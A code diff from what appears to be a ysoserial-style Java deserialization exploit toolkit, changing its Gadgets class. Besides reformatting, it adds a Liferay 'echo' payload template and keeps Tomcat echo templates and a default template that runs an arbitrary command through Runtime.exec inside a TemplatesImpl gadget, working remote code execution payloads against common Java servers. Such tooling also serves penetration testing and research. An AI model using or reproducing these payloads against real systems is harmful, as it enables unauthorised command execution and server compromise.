@@ -11,7 +11,6 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
-
 import java.io.Serializable;
 import java.lang.reflect.*;
 import java.util.HashMap;
@@ -23,9 +22,9 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
     "restriction", "rawtypes", "unchecked"
-} )
+})
 public class Gadgets {
 
     static {
@@ -43,11 +42,13 @@ public class Gadgets {
         private static final long serialVersionUID = -5971610431559700674L;
 
 
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
 
 
         @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
     }
 
     // required to make TemplatesImpl happy
@@ -57,33 +58,35 @@ public class Gadgets {
     }
 
 
-    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
 
-    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
         return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
 
 
-    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-        allIfaces[ 0 ] = iface;
-        if ( ifaces.length > 0 ) {
+        allIfaces[0] = iface;
+        if (ifaces.length > 0) {
             System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
         }
         return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
     }
 
 
-    public static Map<String, Object> createMap ( final String key, final Object val ) {
+    public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<String, Object>();
         map.put(key, val);
         return map;
     }
 
-
+    public static Object createTemplatesImpl(final String command) throws Exception {
+        return createTemplatesImpl(command, "");
+    }
     public static Object createTemplatesImplTomcatHeader(final String command) throws Exception {
         String template = "try {\n" +
             "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
@@ -108,6 +111,29 @@ public class Gadgets {
         return createTemplatesImpl(command, template);
     }
 
+    public static Object createTemplatesImplLiferayEcho(final String command) throws Exception {
+        String template = "try {\n" +
+            "            javax.servlet.http.HttpServletResponse httpServletResponse;\n" +
+            "            javax.servlet.http.HttpServletRequest httpServletRequest;\n" +
+            "            try{\n" +
+            "                Class.forName(\"com.liferay.portal.kernel.security.access.control.AccessControlUtil\");\n" +
+            "                httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();\n" +
+            "                httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();\n" +
+            "            }catch (ClassNotFoundException e){\n" +
+            "                java.lang.reflect.Method method = Class.forName(\"com.liferay.portal.security.ac.AccessControlUtil\").getMethod(\"getAccessControlContext\",null);\n" +
+            "                java.lang.reflect.Method getResponse = Class.forName(\"com.liferay.portal.security.auth.AccessControlContext\").getMethod(\"getResponse\",null);\n" +
+            "                java.lang.reflect.Method getRequest = Class.forName(\"com.liferay.portal.security.auth.AccessControlContext\").getMethod(\"getRequest\",null);\n" +
+            "                httpServletResponse = (javax.servlet.http.HttpServletResponse)getResponse.invoke(method.invoke(null,null),null);\n" +
+            "                httpServletRequest = (javax.servlet.http.HttpServletRequest)getRequest.invoke(method.invoke(null,null),null);\n" +
+            "            }\n" +
+            "            java.io.Writer writer = httpServletResponse.getWriter();\n" +
+            "            int result = Integer.valueOf(httpServletRequest.getParameter(\"a\")).intValue()+Integer.valueOf(httpServletRequest.getParameter(\"b\")).intValue();\n" +
+            "            writer.write(String.valueOf(result));\n" +
+            "            writer.flush();\n" +
+            "        }catch (Exception e){\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
 
     public static Object createTemplatesImplTomcatEcho2(final String command) throws Exception {
 
@@ -168,7 +194,6 @@ public class Gadgets {
         return createTemplatesImpl(command, template);
     }
 
-
     public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
         String param = command == null ? "cmd" : command;
         String template = "        try {\n" +
@@ -227,10 +252,6 @@ public class Gadgets {
     }
 
 
-    public static  Object createTemplatesImpl(final String command) throws Exception{
-        return createTemplatesImpl(command, null);
-    }
-
     public static Object createTemplatesImpl(final String command, String template) throws Exception {
         if (template.equals("")) {
             template = "java.lang.Runtime.getRuntime().exec(\"" +
@@ -283,16 +304,14 @@ public class Gadgets {
     }
 
 
-
-    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
-            IllegalAccessException, InvocationTargetException {
+    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
+        IllegalAccessException, InvocationTargetException {
         HashMap s = new HashMap();
         Reflections.setFieldValue(s, "size", 2);
         Class nodeC;
         try {
             nodeC = Class.forName("java.util.HashMap$Node");
-        }
-        catch ( ClassNotFoundException e ) {
+        } catch (ClassNotFoundException e) {
             nodeC = Class.forName("java.util.HashMap$Entry");
         }
         Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
